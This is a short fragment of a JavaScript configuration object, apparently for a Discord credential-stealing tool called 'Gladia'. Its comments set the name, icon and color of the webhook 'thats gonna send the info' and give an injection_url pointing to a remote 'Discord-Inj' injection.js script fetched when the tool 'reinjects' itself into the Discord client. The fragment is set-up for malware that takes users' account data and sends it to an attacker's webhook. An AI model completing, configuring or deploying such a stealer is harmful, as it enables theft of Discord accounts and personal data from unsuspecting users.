...
const config = {
  ...
  embed_name: 'Gladia', //name of the webhook thats gonna send the info
  embed_icon: 'https://raw.githubusercontent.com/Nowkzy/images/master/gladia.png', //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
  embed_color: 16316664, //color for the embed, needs to be hexadecimal (just copy a hex and then use https://www.binaryhexconverter.com/hex-to-decimal-converter to convert it)
  injection_url: 'https://raw.githubusercontent.com/Nowkzy/Discord-Inj/master/injection.js', //injection url for when it reinjects
  /**
